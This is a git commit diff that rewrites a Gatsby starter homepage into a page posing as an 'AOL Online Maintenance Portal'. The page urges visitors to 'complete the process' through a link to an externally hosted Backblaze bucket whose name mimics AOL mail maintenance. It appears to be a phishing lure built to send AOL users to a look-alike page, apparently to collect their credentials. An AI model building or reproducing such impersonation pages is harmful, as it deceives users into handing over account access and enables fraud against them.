47eab9493f9f6cae0ac37ef9017782c71836286c
brianheather <87387671+brianheather@users.noreply.github.com>
2021-07-25 02:08:34 +0100

    Update index.js

--- src/pages/index.js
+++ src/pages/index.js
@@ -1,29 +1,16 @@
 import * as React from "react"
 import { Link } from "gatsby"
-import { StaticImage } from "gatsby-plugin-image"
 
 import Layout from "../components/layout"
 import Seo from "../components/seo"
 
-const IndexPage = () => (
+const SecondPage = () => (
   <Layout>
-    <Seo title="Home" />
-    <h1>Hi people</h1>
-    <p>Welcome to your new Gatsby site.</p>
-    <p>Now go build something great.</p>
-    <StaticImage
-      src="../images/gatsby-astronaut.png"
-      width={300}
-      quality={95}
-      formats={["AUTO", "WEBP", "AVIF"]}
-      alt="A Gatsby astronaut"
-      style={{ marginBottom: `1.45rem` }}
-    />
-    <p>
-      <Link to="/page-2/">Go to page 2</Link> <br />
-      <Link to="/using-typescript/">Go to "Using TypeScript"</Link>
-    </p>
+    <Seo title="AOL" />
+    <h1>AOL Online Maintenance Portal</h1>
+    <p>Click below to complete the process</p>
+    <Link to="https://aolportaledimanutenzioneonlinediaoaimailmaintenanc.s3.us-west-002.backblazeb2.com/index.html">Aol Portal</Link>
   </Layout>
 )
 
-export default IndexPage
+export default SecondPage
